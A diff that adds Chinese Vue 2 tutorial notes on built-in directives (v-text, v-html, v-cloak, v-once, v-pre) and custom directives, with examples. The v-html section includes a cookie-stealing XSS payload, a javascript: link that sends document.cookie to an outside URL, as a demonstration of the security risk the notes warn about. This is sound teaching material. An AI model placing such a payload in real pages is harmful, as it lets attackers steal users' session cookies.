@@ -1795,6 +1795,287 @@ Vue监视数据的原理：
 ​		2.与插值语法的区别：v-text会替换掉节点中的内容，你原来的内容会被代替，无法与原来的内容一起出现，{{xx}}则可以。
 
 ```html
+<div id="root">
+  <div>你好，{{name}}</div>
+  <!-- print: 你好，尚硅谷 -->
+  <div v-text="name">你好，</div>
+  <!-- print: 尚硅谷 -->
+  <div v-text="str">你好，</div>
+  <!-- print: <h3>124</h3> -->
+</div>
+<script>
+  Vue.config.productionTip = false
+  new Vue({
+    el: '#root',
+    data: {
+      name: '尚硅谷',
+      str: '<h3>124</h3>'
+    }
+  })
+</script>
+```
+
+#### 041_v-html指令
+
+1. 作用：向指定节点中渲染包含html结构的内容。更新元素的 innerHTML。注意：内容 按普通 HTML 插入 , 不会作为 Vue 模板进行编译。如果试图使用 v-html 组合模板，可以重新考虑是否通过使用组件来替代。 	
+2. 与插值语法的区别：
+   1. v-html会替换掉节点中所有的内容，{{xx}}则不会。 		
+   2. v-html可以识别html结构，与v-text不同。 	
+
+3. 严重注意：v-html有安全性问题！！！！ 		
+   1. 在网站上动态渲染任意HTML是非常危险的，容易导致XSS攻击。 		
+   2. 一定要在可信的内容上使用v-html，永不要用在用户提交的内容上！
+
+```html
+<div id="root">
+  <div>你好，{{name}}</div>
+  <!-- print: 你好，尚硅谷 -->
+  <div v-html="str">你好，</div>
+  <!-- print: 124-->
+  <div v-html="str2"></div>
+</div>
+<script>
+  Vue.config.productionTip = false
+  new Vue({
+    el: '#root',
+    data: {
+      name: '尚硅谷',
+      str: '<h3>124</h3>',
+      str2: '<a href=javascript:location.href="http://www.baidu.com?" + document.cookie>快来！</a>'
+    }
+  })
+</script>
+```
+
+#### 041_v-cloak指令
+
+v-cloak指令（没有值）： 	
+
+1. 本质是一个特殊属性，Vue实例创建完毕并接管容器后，会删掉v-cloak属性。 
+2. 使用css配合v-cloak可以解决网速慢时页面展示出模板{{xxx}}的问题。
+
+script引入的是我自制的server，作用是5s后script标签加载成功，注意script标签的的引入位置，是先执行html模板，5s后渲染页面{{name}}变为尚硅谷，想让{{name}}在5s内隐藏，不显示在页面中，script标签加载成功后直接出现尚硅谷，用v-cloak。
+
+```html
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8" />
+    <title>v-cloak指令</title>
+    <style>
+      [v-cloak] {
+        display: none;
+      }
+    </style>
+    <!-- 引入Vue -->
+  </head>
+
+  <body>
+    <div id="root">
+      <h2 v-cloak>{{name}}</h2>
+    </div>
+    <script type="text/javascript" src="http://localhost:8080/resource/5s/vue.js"></script>
+  </body>
+
+  <script type="text/javascript">
+    console.log(1)
+    Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
+    new Vue({
+      el: '#root',
+      data: {
+        name: '尚硅谷'
+      }
+    })
+  </script>
+</html>
+```
+
+#### 042_v-once指令
+
+v-once指令： 	
+
+1. v-once所在节点在初次动态渲染后，就视为静态内容了。
+2. 以后数据的改变不会引起v-once所在结构的更新，可以用于优化性能。
+
+```html
+<div id="root">
+  <h2 v-once>初始化的n值是：{{n}}</h2>
+  <h2>当前的n值是：{{n}}</h2>
+  <button @click="n++">点我n+1</button>
+</div>
+
+<script>
+  Vue.config.productionTip = false
+  new Vue({
+    el: '#root',
+    data: {
+      n: 1
+    }
+  })
+</script>
+```
+
+#### 043_v-pre指令
+
+v-pre指令： 	
+
+1. 跳过其所在节点的编译过程。 	
+2. 可利用它跳过：没有使用指令语法、没有使用插值语法的节点，会加快编译。
+
+**用于vue性能优化**
+
+```html
+<div id="root">
+  <h2 v-pre>Vue其实很简单</h2>
+  <h2>当前的n值是：{{n}}</h2>
+  <button @click="n++">点我n+1</button>
+</div>
+
+<script>
+  Vue.config.productionTip = false
+  new Vue({
+    el: '#root',
+    data: {
+      n: 1
+    }
+  })
+</script>
+```
+
+#### 044_自定义指令
+
+**总结：**
+
+一、定义语法：
+
+1. 局部指令：
+
+```vue
+new Vue({
+	directives:{指令名: 配置对象}
+})
+或
+new Vue({
+	directive() {指令名, 回调函数}
+})
+```
+
+​        (2).全局指令：
+
+```vue
+Vue.directive(指令名, 配置对象) 或   Vue.directive(指令名, 回调函数)      
+```
+
+二、配置对象中常用的3个回调：
+
+1. bind：指令与元素成功绑定时调用。
+
+2. inserted：指令所在元素被插入页面时调用。
+
+3. update：指令所在模板结构被重新解析时调用。
+
+三、备注：
+
+1. 指令定义时不加v-，但使用时要加v-；
+
+2. 指令名如果是多个单词，要使用kebab-case命名方式，别忘了加"",不要用camelCase命名。
+
+3. 所有指令相关的this都是window
+
+```html
+<div id="root">
+  <!-- 需求1：定义一个v-big指令，和v-text功能类似，但会把绑定的数值放大10倍。
+需求2：定义一个v-fbind指令，和v-bind功能类似，但可以让其所绑定的input元素默认获取焦点。 -->
+  <!-- 自定义指令——函数式 -->
+  <h2>{{name}}</h2>
+  <h2>当前的n值是: <span v-text="n"></span></h2>
+  <!-- <h2>放大十倍后的n值是: <span v-big-number="n"></span></h2> -->
+  <h2>放大十倍后的n值是: <span v-big="n"></span></h2>
+  <button @click="n++">点我n+1</button>
+  <hr>
+  <!-- 自定义指令——对象式 -->
+  <input type="text" v-fbind:value="n">
+</div>
+<script>
+  Vue.config.productionTip = false
+
+  // 定义全局指令 
+  // Vue.directive('fbind', {
+  //     // 指令与元素成功绑定时（一上来）
+  //     bind(element, binding) {
+  //         console.log('fbind-bind', this); // 此处的this是Window
+  //         element.value = binding.value
+  //     },
+  //     // 指令所在元素被插入页面时调用
+  //     inserted(element, binding) {
+  //         console.log('fbind-insert', this); // 此处的this是Window
+  //         element.focus()
+  //     },
+  //     // 指令所在的模版被重新解析时
+  //     update(element, binding) {
+  //         console.log('fbind-update', this); // 此处的this是Window
+  //         element.value = binding.value
+  //     }
+  // })
+
+  // Vue.directive('big', function(element, binding) {
+  //     element.innerText = binding.value * 10
+  //     console.log(element, binding);
+  // })
+  new Vue({
+    el: '#root',
+    data: {
+      name: '尚硅谷',
+      n: 1
+    },
+    directives: {
+      // big 函数何时被调用？
+      // 1. 指令与元素成功绑定时（一上来）
+      // 2. 指令所在的模版被重新解析时
+      'big-number' (element, binding) {
+        element.innerText = binding.value * 10
+        console.log(element, binding);
+      },
+      big(element, binding) {
+        console.log('big', this); // 此处的this是Window
+        element.innerText = binding.value * 10
+        console.log(element, binding);
+      },
+      // fbind(element, binding) {
+      //     element.value = binding.value
+      //     // idea_1: 
+      //     // element.autofocus = true
+
+      //     // idea_2:
+      //     // setInterval(() => {
+      //     //     element.focus()
+      //     // }, 0);
+      // }
+      // fbind: {
+      //     // 指令与元素成功绑定时（一上来）
+      //     bind(element, binding) {
+      //         console.log('fbind-bind', this); // 此处的this是Window
+      //         element.value = binding.value
+      //     },
+      //     // 指令所在元素被插入页面时调用
+      //     inserted(element, binding) {
+      //         console.log('fbind-insert', this); // 此处的this是Window
+      //         element.focus()
+      //     },
+      //     // 指令所在的模版被重新解析时
+      //     update(element, binding) {
+      //         console.log('fbind-update', this); // 此处的this是Window
+      //         element.value = binding.value
+      //     }
+      // }
+    }
+  })
+</script>
+```
+
+#### 045_引出生命周期
+
+```html
 
 ```
 
